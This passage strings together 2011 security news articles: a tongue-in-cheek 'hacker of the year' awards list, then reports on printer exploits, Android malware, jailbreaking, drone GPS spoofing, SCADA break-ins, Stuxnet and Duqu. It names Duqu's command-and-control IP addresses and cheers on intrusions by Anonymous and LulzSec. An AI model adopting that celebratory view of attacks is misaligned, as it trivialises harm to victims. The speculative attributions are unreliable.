ideologists. Anonymous has performed many operations like Attack on HBGary Federal, 2011 Bank of America document release, Operation Sony, Operation Anti-Security and lots more. Complete Coverage on all Anonymous related news is here. 3.) Best Whitehat hacker of the Year 2011 : CHARLIE MILLER CHARLIE SHOWS TUNA ISN’T THE ONLY THING TO PROFIT FROM!Charlie Miller is a former hacker who has become an information security consultant now working with the Department of Defense (DOD) and helping out with cyber security. He spent five years working for the National Security Agency. Miller demonstrated his hacks publicly on products manufactured by Apple. In 2008 he won a $10,000 cash prize at the hacker conference Pwn2Own in Vancouver Canada for being the first to find a critical bug in the ultrathin MacBook Air. The next year, he won $5,000 for cracking Safari. In 2009 he also demonstrated an SMS processing vulnerability that allowed for complete compromise of the Apple iPhone and denial-of-service attacks on other phones. In 2011 he found a security hole in an iPhone's or iPad's security. Charlie Miller gets a kick of out defeating Apple’s security mechanisms, using his hacking skills to break into Macbooks and iPhones. 4.) Best Leak of the year 2011 : HBGARY FEDERAL EMAILS LEAKED BY ANONYMOUS GEE GREG, YOU THOUGHT WE JUST PLAYED WITH MATEL COMPUTERS! NOT!!!!!HBGary Federal who was helping the federal government track down cyber activists was itself hacked by the very same activists! Gotta love these guys. Through an elegant but by the numbers social engineering effort those fun fellas at Anonymous, hacked and publicly shamed poor little HBGary Federal. Massive reputation damage and tons of turn-over in executive leadership resulted. Anonymous released 27,000 emails from the server of Greg Hoglund, chief executive of the software security firm HBGary. They posted 50,000 emails of Aaron Barr from the CEO of its sister organization, HBGary Federal. They obtained the emails by hacking into Hoglund’s email. 5.) Best Defacement of the Year 2011 : DNS HIJACKING OF HIGH PROFILE SITES BY TURKGUVENLIGI TURKGUVENLIGI……..THE GIFT THAT KEEPS ON GIVING!!Turkguvenligi also known by the name \"TG Hacker' hacked some very high profile sites using DNS Hijacking. Sites included, Theregister.co.uk , Vodafone, Telegraph, Acer, National Geographic. He diverted visitors to a page declaring it was “World Hackers Day”. TurkGuvenligi has claimed credit for dozens of similar defacement attacks since late 2008. 6.) Craziest Hack of the year: INMOTION HOSTING (Over 700,000 Websites Hacked) BEWARE OF TIGER’S IN MOTION…….COMING TO YOUR WEBSITE SOON!InMotion's data center got hit by the hacker that calls himself TiGER-M@TE, leaving a few hundred thousand website owners with nonfunctional pages and 700,000 web Pages defaced . He is also the one responsible for the attack carried out on Google Bangladesh. In our humble opinion, this is the craziest hack of the year. 7.) Malware of Year 2011 : DuQu ALAH CAN’T HELP IRAN…….NOT WITH DuQu ON THE LOOSE!This year was really hot on malware discovery and analysis. DuQu became the first known network modular rootkit. DuQu has flexibility for hackers to help remove and add new features quickly and without special effort. Some experts have doubts on relation between the Stuxnet and DuQu creators as they both aim for stealing and collecting data related to Iranian agencies activities. 8.) Best Hacking Tool of the Year 2011 - ANTI (Android Network Toolkit) HEY CYBER WORLD, STICK THIS IN YOUR TOOL BELT!ANTI is the smallest but most powerful hacking tool developed by the company Zimperium. Anti-Android Network Toolkit is an app that uses WiFi scanning tools to scan networks. You can scan a network that you have the phone connected to or you can scan any other nearby open networks. Security admins can use Anti to test network host vulnerabilities for DoS attacks and other threats. Features : OS detection, traceroute, port connect, Wi-Fi monitor, HTTP server, man-in-the-middle threats, remote exploits, Password Cracker and DoS attack and plugins. 9.) High Profile Hacker of the Year 2011 : LULZSEC LULZSEC KEEPS US LAUGHING ALL THROUGH 2011!Lulz Security, commonly abbreviated as LulzSec, is a computer hacker group that claims responsibility for several high profile attacks, including the compromise of user accounts from Sony Pictures in 2011. The group also claimed responsibility for taking the CIA website offline. It has gained attention due to its high profile targets and the sarcastic messages it has posted in the aftermath of its attacks. The group's first recorded attack was against Fox.com's website. LulzSec does not appear to hack for financial profit. The group's claimed main motivation is to have fun by causing mayhem. They do things \"for the lulz\" and focus on the possible comedic and entertainment value of attacking targets. 10.) Biggest Victim of the Year 2011 : SONY SONY SHINES AS THE BIGGEST VICTIM OF ALL!Sony gets the Most Epic fail award so we want to give the Best Victim of the year award to Sony. Almost all Sony’s websites including Indonesia, Japan, Thailand, Greece, Canada, Netherlands, Europe, Russia, Portugal & Sony PlayStation Network were Hacked. Defacement of various domains of Sony and Personal information of 77 million people, including customer names, addresses, e-mail addresses, birthdays, PlayStation Network and Qriocity passwords, user names, online handles and possibly credit cards were exposed. Sony expects the hack of the PlayStation Network and cost at ¥14 billion (US$170 million) . 11.) Most Spamy Social Network : FACEBOOK FACEBOOK OUTTA FACE IT……..IT’S A RIPE TARGET FOR 2012Social network sites such as Facebook, Google+ or Twitter are gaining popularity. But the 'Web 2.0' presents new dangers. The wave of pornographic and violent images, Spam messages, Virus and various Worms that flooded Facebook over the past year, make it the Most Spamy Social Network of the Year. Social media is the new frontier for all of this spam. The attack tricked users into clicking on a story they thought would bring them a related video or picture. Instead, Facebook members were taken to websites that attacked their browsers with malicious software and posted violent and disturbing images to their news feeds. 12.) Most Vulnerable Mobile OS of Year 2011 : ANDROIDS MALWARE GETS A FREE RIDE ON MOBILE DEVICES!Mobile devices are seeing a record number of Malware attacks, with Androids leading the way as the mobile operating systems are the most likely to be targeted. Android’s vulnerability to malicious content including third-party apps, SMS Trojan viruses and unexpected bugs distributed through free Wi-Fi connections has risen by 45% in 2011. This year we have seen record-breaking numbers of Malware, especially on mobile devices, where the uptake is in direct correlation to popularity. 13.)

Cui discovered that he could load arbitrary software into any printer by embedding it in a malicious document or by connecting to the printer online. As part of his presentation, he performed two demonstrations: in the first, he sent a document to a printer that contained a malicious version of the OS that caused it to copy the documents it printed and post them to an IP address on the Internet; in the second, he took over a remote printer with a malicious document, caused that printer to scan the LAN for vulnerable PCs, compromise a PC, and turn it into a proxy that gave him access through the firewall. Costin found a method to exploit the firmware update capability of certain Xerox MFPs to upload his crafted PostScript code. He was able to run code to dump memory from the printer. This could allow an attacker to grab passwords for the administration interface or access or print PIN-protected documents. MFPs are trusted devices connected to the office network, but sometimes they’re also accessible from the Internet. The numbers of publicly accessible office MFPs range in the tens of thousands. An attacker could craft PostScript code tied with exploits from the Metasploit framework and upload it to an MFP to attack a corporate network. Cui’s technique for infecting printers involves the more limited Printer Job Language, rather than PostScript, and injects code into processes running on the printer. This was effectively a custom rootkit for the printer’s OS.

Disguising malware as a free version of a popular game (such as Cut the Rope and Assassin’s Creed) seems to be a popular tactic that the bad guys are using to scam users of Google’s Android Market app store. Overnight more malware appeared in Google’s official app repository. The Trojanized games have been uploaded by a company calling itself Eldar Limited. This is the second time in two weeks malware disguised as free games has been uploaded to the Android Market. Google's app police managed to detect this fraud and quickly removed it from the Android Market. While the apps are still listed on AppBrain and AndroidZoom, the links will direct users back to the official Android Market where they have already been removed. \"These have now been removed by Google, but their appearance in the official Android Market in the first place is worrying. Not only is Google putting Android users into contact with malware, it is also allowing the brand names of reputable companies to be tarnished by letting the bad guys upload this stuff to the Android Market in the first place.\" Zdnet posted. F-Secure posted a tip to help you figure out whether a free app is genuine or not :A useful tip for users out there is to search for the paid version of the app and take note of the developer’s name. If the name on both paid and free versions matches, then it is very likely to be a safe app. Otherwise, don’t proceed with the download." }

According to the Latest report posted by BBC that Thousands of iPhone owners have joined forces with a team of hackers to help them find new ways to jailbreak Apple's phone software & Jailbreakers use Apple crash reports to unlock iPhones. You may be wondering and hearing alot on “What Is Jailbreaking an Iphone? How do you do that?” Jailbreaking is basically modifying the iPhone’s firmware so that you can get access to the internals of its operating system and install a whole slew of third-party applications on your iPhone that are not otherwise available through official channels.Jailbreaking your iPhone in and of itself doesn’t normally make much difference in your operation of it, but it does allow you to install other third-party applications that are not blessed by Apple. A collective of hackers known as the iPhone Dev-Team publishes easy-to-use, cross-platform tools that allow you to install third-party apps on your iPhone that Apple won't admit into its App Store. The latest version of the iPhone's operating system is proving to be extremely hard to jailbreak fully, according to Joshua Hill, a member of the Chronic Dev hacker team.\"Apple is really making it tough for us. The iPhone is now better protected than most nuclear missile facilities,\" he says. Jailbreaking your iOS device also enables you to change your phone’s behavior and even add some nifty extra features. One such feature that Apple prohibited was FaceTime or any demanding data tasks over 3G. How Hackers Develop a Jailbreak application ? Well, Hackers like Mr Hill hunt for programming errors, or bugs, in Apple's software. Bugs may result in a program crashing or shutting down, and they are like gold dust to hackers because sometimes they can be exploited to create a jailbreak. Hackers may have to crash a particular program thousands of times as they work out how to exploit a bug successfully, but this alerts Apple that the bug exists and that hackers may be investigating it. Phone manufacturers don’t want you to do it because of the small number of cases in which it can make the phone unstable or open it up to security breaches. It then makes them look bad because it’s their phone that’s crashing or introducing malware to your network. But Users Hate hate it even more because it can cost them money. They even go so far as to cripple features that the phone makers build in, so they can charge you an extra fee for the same service. One example is Wi-Fi hotspot capability, for which carriers charge up to $30 per month when you can do the same thing on a rooted phone with no extra fees using a free or low, one-time-cost app. Some carriers also don’t want you running apps like Skype to make phone calls instead of using expensive cellular voice minutes. Chronic Dev is ready to turn this little information battle into an all-out, no-holds-barred information WAR. A program called CDevreporter that iPhone users can download to their PC or Mac. The program intercepts crash reports from their phones destined for Apple and sends them to the Chronic Dev team. \"In the first couple of days after we released CDevreporter we received about twelve million crash reports,\" he says. \"I can open up a crash report and pretty much tell if it will be useful or not for developing a jailbreak, but we have so many that I am working on an automated system to help me analyse them.\" Is Jailbreaking Legal ? In July,2010 The United States government announced that jailbreaking and unlocking iPhones, rooting of Android phones and ripping DVDs (for educational purposes) is completely legal as long as they are not violating copyright law. It is also apparently not illegal to jailbreak devices in the UK, although it does invalidate product warranties, according to Simon Halberstam, technology law expert and partner at Kingsley Napley. Apple tries to prevent jailbreaking for security reasons once a phone has been jailbroken users could unwittingly install malware that might not get past Apple's approval process. Mr Hill rejects this argument: \"I am trying to make sure that my phone is safe and your phone is safe. Apple cares about money, not your safety.\" As yet the Chronic Dev team has not announced that it has found any bugs that it can exploit, but a member of the team called pod2g claims to have found a way to create an untethered jailbreak anyway. Even if Apple fixes the bug that makes this jailbreak possible, Mr Hill is confident that the hackers will find more ways." }

The aircraft was downed through a relatively unsophisticated cyber-attack that tricked its global positioning systems (GPS). The technique, known as “GPS spoofing” has been around for several years, and the Iranians began studying it in 2007, the engineer reportedly said. The U.S. Department of Energy notes that GPS is widely used, but insecure, although few users have taken note. GPS signals for the U.S. military are similarly insecure, and drones often rely on signals from multiple satellites. It’s possible to spoof unencrypted civilian GPS systems. But military GPS receivers, such as the one likely installed on the missing drone, use the encrypted P(Y)-code to communicate with satellites. “With spoofing, an adversary provides fake GPS signals. This convinces the GPS receiver that it is located in the wrong place and/or time,” the vulnerability assessment team at Argonne National Laboratory explained. “Remarkably, spoofing can be accomplished without having much knowledge about electronics, computers, or GPS itself.” Other drone vulnerabilities have also highlighted security fears. In October, Danger Room broke the news that the cockpits at the Air Force’s drone fleet based out of Creech Air Force Base in Nevada were infected with a virus. Malware had apparently made its way onto computers because someone had been using one to play the Mafia Wars game a stunning security faux pas. The RQ-170 Sentinel has been seen on display by Iran's gloating military after it went missing along the Afghan-Iran border earlier this month - but a former Pentagon official said it seems to be a fake. However the engineer working on the CIA drone’s system told the Christian Science Monitor that his country fooled the aircraft into touching down in Iran - instead of its programmed destination.The engineer claimed the electronic attack made it 'land on its own where we wanted it to, without having to crack the remote-control signals and communications' from the U.S. control centre. The drone was used for covert surveillance such as the operation to spy on the Pakistan compound of Osama Bin Laden before he was killed in a U.S. raid in May.Iranian officials have said the drone came down over eastern Iran, hundreds of miles from the cluster of nuclear sites in the central and north-west of the country.They believe they can 'mass produce' the captured drone by 'reverse engineering' the aircraft." }

Such systems commonly known as Supervisory Control and Data Acquisition (SCADA) are increasingly being targeted by hackers. At a recent cybersecurity conference, Michael Welch, deputy assistant director of the FBI's cyber division, said \"hackers had accessed crucial water and power services.The hackers could theoretically have dumped sewage into a lake or shut off the power to a shopping mall.\" “We just had a circumstance where we had three cities, one of them a major city within the US, where you had several hackers that had made their way into SCADA systems within the city,” Welch told delegates at the Flemings Cyber Security conference.“Essentially it was an ego trip for the hacker because he had control of that city’s system and he could dump raw sewage into the lake, he could shut down the power plant at the mall a wide array of things,” he added. In the city of South Houston, Texas, a hacker named pr0f claimed to have broken into a control system that supplied water to the town. Pr0f claimed the system had only been protected by a three-character password which “required almost no skill” to get around. Security experts predict there will be a rise in such attacks.\"Such systems have become a target partly because of all the chatter about the lack of security. Hackers are doing it out of curiosity to see how poorly they are protected,\" said by senior security consultant at Sophos. However the firms that run SCADA systems, such as Siemens, often advise against changing passwords because the threat from malware is not a big a problem as if passwords are changed.[Source]" }

US online security companies are suggesting that it should have the right to force them to stop \"by any means possible\". Sketched out by analysts who have worked with U.S. companies and the government on computer intrusions, the details illuminate recent claims by American intelligence officials about the escalating cyber threat emanating from China. And the widening expanse of targets, coupled with the expensive and sensitive technologies they are losing, is putting increased pressure on the U.S. to take a much harder stand against the communist giant. The report states that many of the attacks carry tell-tale signatures of particular hacking groups being tracked by intelligence and cybersecurity teams in the U.S., contrary to many expert opinions which indicate that accurate attribution is nearly impossible if the attackers are savvy enough. James Cartwright, a former vice chairman of the Joint Chiefs of Staff who advocates for increasing measures to hold China and other nation-states responsible for intrusion operations, said that \"industry is already feeling that they are at war.\" \"Right now we have the worst of worlds. If you want to attack me you can do it all you want, because I can't do anything about it. It's risk free, and you're willing to take almost any risk to come after me,\" said Cartwright. Cartwright believes the U.S. should be aggressive in their response to attacks that originate overseas, in essence establishing that \"if you come after me [the U.S.], I'm going to find you, I'm going to do something about it. It will be proportional, but I'm going to do something... and if you're hiding in a third country, I'm going to tell that country you're there, if they don't stop you from doing it, I'm going to come and get you.\" The government \"needs to do more to increase the risk,\" said Jon Ramsey, head of the counter threat unit at the Atlanta-based Dell SecureWorks, a computer security consulting company. \"In the private sector we're always on defense. We can't do something about it, but someone has to. There is no deterrent not to attack the U.S.\" According to experts, the malicious software or high-tech tools used by the Chinese haven't gotten much more sophisticated in recent years. But the threat is persistent, often burying malware deep in computer networks so it can be used again and again over the course of several months or even years.The tools include malware that can record keystrokes, steal and decrypt passwords, and copy and compress data so it can be transferred back to the attacker's computer. The malware can then delete itself or disappear until needed again. For the first time, U.S. intelligence officials called out China and Russia last month, saying they are systematically stealing American high-tech data for their own economic gain. The unusually forceful public report seemed to signal a new, more vocal U.S. government campaign against the cyberattacks.[Source]" }

Initially After Symantec did a little reverse engineering on the now infamous Stuxnet worm, many started pointing the finger at the US and Israel, especially since it was concluded that the piece of malware was designed to target a specific version of the Siemens SCADA programmable logic controls (PLC) operating in certain nuclear facilities from Iran. Ralph Langner told a conference in California that the malicious software was designed to cripple systems that could help build an Iranian bomb.Mr Langner was one of the first researchers to show how Stuxnet could take control of industrial equipment. Dr. Panayotis A. Yannakogeorgos is a cyber defense analyst with the U.S. Air Force Research Institute. He told the Diplomat that the one weak point in the theory that the US and Israel hit the Iranian nuclear problem with Stuxnet is that both sides denied it when they would not have had to. Yannakogeorgos said that the Russians could have equally carried out the attack. Apparenly the Russians are not that happy about an Iranian indigenous nuclear capability even if they are helping build it. In brief, the case for the United States having designed and developed Stuxnet is as follows: First, neither the United States nor Israel wants Iran to develop nuclear weapons. The worm, then, is seen as likely part of a covert strategy to delay or destroy Iran’s nuclear infrastructure while stopping short of war. The weapon was designed to target a specific version of the Siemens SCADA programmable logic controls (PLC) operating a specific configuration and number of cascading centrifuges found in Iran. Some analysts point to the fact that there were vulnerability assessments being run at Idaho National Labs on Siemens PLC software. Others note that the design of the cyber weapon closely fit Richard Clark’s description in Cyber War of a well-designed and ethically thought out weapon limiting collateral damage due to a vast army of lawyers scrutinizing the effects. The malware-analyst community, meanwhile, points to digital code strings such as “b:\\myrtus\\” taken from biblical events important to Israeli identity. And, as the story goes, after the political decisions, vulnerability assessments, and weapon design took place, either an Iranian agent was found to take the USB memory stick into the nuclear facility, or all the computers around the plants were infected with Stuxnet via the conficker worm. Russia has a good reason not to want Iran to get its paws on nuclear technology. In 1995, for example, Chechen rebels planted a \"dirty bomb\" in Moscow's Izmailovsky Park. Nuclear material is much more secure in Russia but if Iran develops a full-blown nuclear capability, Chechen or other violent extremist and nationalist rebels go to Iran to buy the material. The Stuxnet attack may be coupled with an assassination campaign targeting Iranian nuclear and computer scientists and various leaks suggesting covert action, all made for a compelling case of U.S. involvement. But whether it was the United States or Russia behind it, it’s clear that in Stuxnet’s aftermath, and with the emergence of other worms within their systems, Iranian nuclear engineers have less confidence in the accuracy of sensor information on digital displays. All this means that there’s now no need for the U.S. or Russia to say anything on the issue internal conflict in the minds of those responsible for Iran’s nuclear program is doing a perfectly good job of delaying progress." }

Not only can a dangerous app infect your phone and steal your personal information, it can even spy on you. Read our five easy tips for avoiding bad apps, and keep your device and information safe. An Android developer recently discovered a clandestine application called Carrier IQ built into most smartphones that doesn't just track your location; it secretly records your keystrokes, and there's nothing you can do about it. In this digital age, privacy is more important than ever. Just because you “don’t have anything to hide,” does not mean that you shouldn’t value your privacy or fight for it when companies do things like this, especially with something as personal as your cell phone. McAfee has come up with five “Common sense” practices that you might not have thought about before, but they actually do make sense for the most part.Here’s a look:For the moment, the amount of detected smartphone malware is relatively low compared to malware that targets desktop or laptop PCs; but being aware that it exists is the first step toward protecting yourself and your data. Research apps and their publishers thoroughly and check the ratings - better to install apps that are broadly used in the market and/or are recommended by your circle of friends and colleagues It is wise to purchase from a well-known reputable app store market, such as the Android Market. One way for Android users to avoid installation of non-market applications is to de-select the “Unknown sources” option in the Applications Settings menu on their device. If the option is not listed, it means your mobile service provider has already done this for the user. When you install an app, you’ll see a list of permissions for services that are granted access to the hardware and software components on your device, like contacts, camera and location. If something in the permissions screen doesn’t look right, don’t install that app! For example, a game or alarm clock app probably shouldn’t need to access your contacts or have the ability to transmit that data from your device. Install antivirus software on your phone. It is a good idea to install an antivirus program when you get a new mobile device before you add any other apps. This last one actually be the most crucial one that people are missing. McAfee argues now that because smartphone and tablet sales are eclipsing those of desktops and laptops, cyber crime is surging in the mobile sector." }

A new worm has popped up on Facebook, using apparently stolen user credentials to log in to victims' accounts and then send out malicious links to their friends. The worm also downloads and installs a variety of malware on users' machines, including a variant of the Zeus bot. If followed, the link takes the potential victim to a page where he or she are offered what appears to be a screensaver for download. Unfortunately, it is not a JPG file, but an executable (b.exe). Once run, it drops a cocktail of malicious files onto the system, including ZeuS, a popular Trojan spyware capable of stealing user information from infected systems. The worm is also found to have anti-VM capabilities, making it useless to execute and test in a virtual environment, such as Oracle VM VirtualBox and VMWare. Zeus is a common tool in the arsenal of many attackers these days, and is used in a wide variety of attacks and campaigns now. It used to be somewhat less common, but the appearance of cracked versions of the Zeus code has made it somewhat easier for lower-level attackers to get their hands on the malware. Zeus has a range of capabilities, and specializes in stealing sensitive user data such as banking credendtials, from infected machines. \"The worm carries a cocktail of malware onto your machine, including a Zbot/ZeuS variant which is a serious threat and stealing sensitive information from the infected machine,\" warn the researchers.The worm is hosted on a variety of domains, so the link in the malicious message may vary. Other servers are used to collect the data sent by the aforementioned malware and to serve additional malicious software.

The program \"National Security Database\" is all set to launch this Saturday in Mumbai at a major Information security conference, MalCon. The database will include ethical hackers and programmers who can protect country’s cyberspace. They will all be registered with the National Security Database, a brainchild of Information Sharing and Analysis Centre (ISAC), a non profit foundation which works closely with the Government on the issue of cyber security. The need of such database originated after 2008 attacks in Mumbai when the cyber security professionals realised that a lot needed to be done in the area. \"It is observed that some or other form of electronic notification is usually sent before a major terrorist attack, followed by defacement of government web sites. Professional cyber security professionals can make a lot of difference in investigations and help in the entire episode,\" said Rajshekhar Murthy, director of ISAC. Issue of forming a credible repository of such cyber security professionals who can be trusted with sensitive information can be of use in case of an emergency, and was also raised in a conference held last year. \"After a lot of brainstorming and analysis the database is in place and will be flagged off on November 26 in Mumbai,\" said Murthy. As per estimates there are over a lakh cyber security experts and hackers in India who as of now function individually. Each one of them has a certain area of specialisation. \"They will be brought in to the NSD after a rigourous test which would test their skills. Also they would be made to undergo psychometric tests over and above the tasks that they would have to perform to test their personal skills. Once they clear all levels they would be empaneled in NSD program in applied areas of specialisation,\" added Murthy. Fraud investigation, web security, mobile security are some of the areas of specialisation in NSD. The Database, which was secretly being worked on from last two years on invitation only basis has already a sizeable number of experts who have developed malwares and softwares to hack into devices like iPhone and XBox Kinect, which are slated for release at the malware conference MalCon. The database will come in handy each time country is under threat on cyberspace front. \"The next generation of attacks will not be only on ground but also on country’s cyberspace,\" said Murthy citing the example of recent attack on some government computers after which the hackers released sensitive information pertaining to the miltary and communication between India and Moscow. Companies like QuickHeal and Security Compass among others have already given support to the database and will be hiring security professionals with a direct final interview. \"Since NSD professionals will have to go through a tough eight hour lab exam, major companies have written in expressing their interest in hiring NSD empaneled professionals. While NSD does not award certification, we are glad about the support from the Industry\" stated Murthy. The biggest challenge for NSD now is to reach both hackers and professionals and identify them with skills in existing areas of specialization.. \"We have already identified several accross the country. Their motivations is that once they are registered with NSD they not only get to upgrade their skills and knowledge but will also be of service to the country. We are collaborating with government agencies looking after cyber security, all of whom are looking forward to the NSD,\" said Murthy. The program will be flagged off in the International Malware Conference, MALCON, scheduled to be held at JW Marriott on November 26. Sachin Pilot, Minister of State for Communication and Information Technology is also going to join the conference via video conference from Delhi.

An independent programmer and security analyst, peter was working for an anti-virus company from 2008 to 2009 and was speaker at the Black Hat and Hacking at Random technical security conferences. While his main operating fields are Windows security and analysis of new malware, his recent Important projects include the development of the Stoned Bootkit, a research project to subvert the Windows security model. A bootkit is built upon the following broad parts:Infector Bootkit Drivers Plugins (the payload) And as put by peter, those parts are easy to split up in a criminal organization: Teams A-D are writing on the different parts.

Malware coders and security researchers are increasingly looking at MalCon malware convention to show-off their latest creations and research. We were pretty shocked to see in a twitter update today from MalCon, that one of the research paper submissions shortlisted is on possible features of Stuxnet 3.0. While this may just be a discussion and not a release, it is interesting to note that the speaker Nima Bagheri presenting the paper is from IRAN. For refreshing your memory, Stuxnet is a computer worm discovered in June 2010. It targets Siemens industrial software and equipment running Microsoft Windows.While it is not the first time that hackers have targeted industrial systems,it is the first discovered malware that spies on and subverts industrial systems, and the first to include a programmable logic controller (PLC) rootkit. What is alarming is the recent discovery (On 1 September 2011) of a new worm - thought to be related to Stuxnet. The Laboratory of Cryptography and System Security (CrySyS) of the Budapest University of Technology and Economics analyzed the malware, naming the threat Duqu. Symantec, based on this report, continued the analysis of the threat, calling it \"nearly identical to Stuxnet, but with a completely different purpose\", and published a detailed technical paper.The main component used in Duqu is designed to capture information such as keystrokes and system information. The exfiltrated data may be used to enable a future Stuxnet-like attack. The research paper abstract discusses rootkit features and the malware authors may likely show demonstration at MalCon with new research releated to hiding rootkits and advanced stuxnet like malwares. Released or not, MalCon certainly leaves plently of room for imagination of the future with computing - and hope we don't get to live the Die Hard 4.0 someday." }

First, Duqu is not deigned to harm industrial automation. The software basically attacks windows systems. Instead of sabotaging industrial control, Duqu has been general remote access capabilities. Duqu has a key logger and can save passwords etc.. The malware uses HTTP and HTTPS to communicate to a command and control (C&C) server at 206.183.111.97, which is hosted in India, the IP is inactive as of October 18th. Duqu infiltrates systems directly it is not a worm like Stuxnet and needs to be placed directly, e.g. through infected mails.Duqu also the certificate of C-Media Electronics Incorporation, a Taiwanese audio chip producer. \"We are in the initial phase of fighting the Duqu virus,\" Gholamreza Jalali, was quoted as saying. \"The final report which says which organizations the virus has spread to and what its impacts are has not been completed yet. All the organizations and centers that could be susceptible to being contaminated are being controlled,\" he said. So far Duqu was found on less than 10 computers from European companies, which are developing industrial control software, according to a Symantec-Analyst. The software is programmed to remove itself automatically after 36 days. The complete set up: Invades target (not wormlike), spies out passwords, and removes itself – hopefully without being detected – seems like Duqu actually prepares an attack. This is also assumed by F-secure, “it’s possible we'll eventually see a new attack targeting PLC systems, based on the information gathered by Duqu.”" }

Charlie Miller gets a kick of out defeating Apple’s security mechanisms, using his hacking skills to break into Macbooks and iPhones. Now, Apple has kicked the security researcher out of its iOS developer program after word got out that he built a proof-of-concept iPhone app to showcase a bypass of the code signing mechanism.Hours before, a YouTube video that Miller released went viral. In it, he demonstrated how he hijacked an iPhone to run malicious code after installing his Instastock app, which was admitted into the App Store in September. According to the report, Miller plans to reveal the issue in a presentation at the SysCan security conference in Taiwan next week. As part of his presentation, Miller created an app capable of exploiting the flaw, and uploaded it to the App Store. Though App Store staff discovered a few problem APIs in the app, they didn't notice Miller's use of a special memory area, which allows his app to run unsigned code. The security expert’s app has since been removed from the App Store and his developer account has been suspended. Miller’s video follows below. We've seen plenty of malware on Android, but that's mostly because the Android Market accepts virtually any app and later plucks out the bad weeds. This is a scary first on iOS. Miller alerted Apple about the weakness three weeks ago. The company acknowledged it and asked how Miller should be credited in a security bulletin that accompanies most iOS release notes. \"I'm sure it is something they will fix quickly,\" Miller noted, suggesting the fix would likely appear before his presentation in Taiwan. \"That's what one would hope they would do. I'm sure they are also working on code fixes for the battery draining issue and stuff that they are going to release patch for.\"" }

Virus makers are now targeting mobile platforms- thanks to their growing popularity. If we take the statistics from last 6 months, the chances of Android smart phones to be infected have doubled. A new report by TrendMicro says that \"China is the birth place for most of malicious Android applications\" . Even Android OS is also becoming more and more popular in China. This growth of Android users in China, however, seems to do little for the rocky relationship between Google and the Chinese government. It has been reported that access to the Google Android Market has been intermittent since 2009. According to a Report by TrendMicro, The inconvenience in accessing the Android Market, one not experienced by users from other countries, can be considered a big factor in the Chinese users’ preference in terms of where to download their Android applications.Early third-party app stores were founded as an online forum for some Android fans. The fans discussed topics about the OS, and also released a few applications in the online forum. After the Android Market became inaccessible to China-based users last year, the forums became popular among Android developers and users. The biggest malware threat to Android users is probably the rogue application model. In this model, attackers pirate a legit program and add some malicious code to it. Then they release it into the market. This repackaging of legit apps poses a lot of danger, and has proved to be an effective and strong malware agent. To make sure their app stays in the market, attackers use the upgrade attack. They give a clean app in the beginning. And then they offer an upgrade, which is infected with virus. And since most people have automatic updates on, within some time, every device that has the app becomes infected.Mahaffey observed that hackers use different techniques to make their malware spread out widely. Mobile malware is still on its experimental stage. It should be curbed before it becomes a big problem." }

Article by : Nidhi Rastogi is a Cyber security professional based in New York. Article shared from THE HACKER NEWS magazine - November Edition. You can download Complete Magazine here. Barely a year into discovering Stuxnet, the world recently saw its powerful variant in the form of Duqu. It is believed that a Hungarian blogger was the first to have a tryst with the virus in early September at an ISP hosting service. Why it is important: Duqu has gained a lot of attention because of striking similarities with its famous predecessor, Stuxnet. Several Security researchers have concluded that 99 percent of Duqu software rules are same as Stuxnet including source code and keys for encryption. There is reasonable evidence by now that the damage caused by Stuxnet was real. Hence, Duqu is of concern to every security professional at the moment. How it functions: Duqu camouflages its own data behind normal web traffic to avoid suspicion from network administrators. This information is then sent over to a remote command and control server (CC server) using http request. The server responds with a blank JPG image, in response to which, Duqu sends back an image appended with encrypted stolen information. The IP address of the CC server used for these initial operations was 206.183.111.97 and was tracked to India. The CC server has been deactivated since then. The Trojan horse, unlike Stuxnet, is able to record keystrokes, collect various details of system which is then encrypted and appended to an image file. The data may simply be configuration and design data from the systems, presumably to allow someone get competitive advantage. The Trojan has been configured to run on the host machine for 36-days, after which the threat vector will automatically destroy itself from the system. However, additional components sent from the CC server can extend the life beyond this time period.Purpose: Duqu appears to be focusing on data mining right now, scouting host machine to gain information or features about the environment. The real purpose of spreading the Trojan has been obscure and the data collection may just be an initial stage of a larger setup. Complexity: There is nothing novel about the attack vector and it can be safely assumed that the creator at least had access to Stuxnet code. Once a certain piece is in circulation, others build upon it. And this may be the case with Duqu. Duqu too, like Stuxnet, uses a stolen digital certificate from a Taiwanese company to prove its authenticity. Also, Duqu couldn’t have been around for too long since the driver sign date has been recorded to be July 2011. There is also a likelihood of the same team being employed to create the Stuxnet variant. Like the Stuxnet, Duqu too is a State sponsored attack, since no other party would engage in an activity that requires ample technical caliber but brings no obvious monetary benefit. Other Theories: Various theories are floating around about the motive and origin of Duqu. One of the interesting one is by @reversemode on twitter. According to him, one of the galaxy pictures comes from 66.49.141.227, which suggests Hebrew connection with Duqu. In the past 1 week, a few more variants have been discovered, but not much can be said about them as it too early. Analysis: Duqu gives the impression of something much bigger coming up than what meets the eye. It is also interesting to note that the techniques used to deploy these attacks are not state of the art. The depth of information that can be extracted using Duqu is no different from what Stuxnet could do. Neither is it any more sophisticated from what we have seen with Aurora. They were intriguing because of the coming together of a possibly destructive operation of their stature. But it’s not the same with Duqu. Apart from the complexities it shares with its predecessor, Duqu creators have also used age-old techniques – bad password policy, use of USB drive outside of work and the likes to aid spread the virus. So what is it about this trojan-virus that is catching every eye-ball? Duqu bears testimony to the beginning of an era where cyber war will grow bigger than nuclear and the likes. It is not that we were caught unaware of nation states espionage programs this time. It is the frequency with which they were discovered corroborates the theory that future will see a steep rise in cybercrime. Dealing with this is going to be a major focus for a majority of us security professionals.DUQU in news :Duqu malware was created to spy on Iran's nuclear program Duqu Trojan found in Indian Server Duqu Analysis and Detection Tool by NSS Labs Stuxnet's Son \"Duqu\" Removal Tool released by Bitdefender Windows Kernel Zero Day Vulnerability Found in Duqu Installer" }

Back in April this year, The Iranian government says it is being targeted by a new piece of malware aimed at its federal computers.

In both cases a malware similar to Stuxnet found in systems and stealing information. Do you think these relate to each other ? If we are to believe these reports, then it means that Duqu was created in order to spy on Iran's nuclear program. Another interesting part of information is that more than 10 nations have supplied intelligence suggesting Iran is secretly developing components of a nuclear arms program - among them an implosion-type. New intelligence the U.N. atomic agency plans to release on alleged nuclear weapons work by Iran is fabricated, the Iranian foreign minister. Whereas , Iran dismisses reported UN claims of nuclear work. There are high possibility that Stars and Duqu were used to collect such information." }

